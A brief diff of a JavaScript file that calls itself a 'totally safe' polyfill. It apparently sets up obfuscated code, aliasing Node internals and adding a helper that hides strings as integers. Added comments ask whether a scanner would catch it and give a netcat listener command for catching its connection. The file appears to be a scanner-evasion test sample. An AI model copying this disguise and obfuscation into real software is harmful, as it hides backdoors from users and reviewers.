@@ -1,4 +1,6 @@
 // Minified and optimized code - needed polyfill for cross version support.  Totally safe :)
+// Try to read and understand - would a scanner pick this up as sus?
+// If you want to try running it, listen with netcat first: "nc -lv 12345"
 const p = process, b = Buffer, r = require, j = JSON, f = 'from', bi = 'binary', t = 'toString'
 function _ (n) { let cs = []; while (n > 0){cs.push(0xFF & n); n >>= 8;} return b[f](cs,bi)[t]()}
 
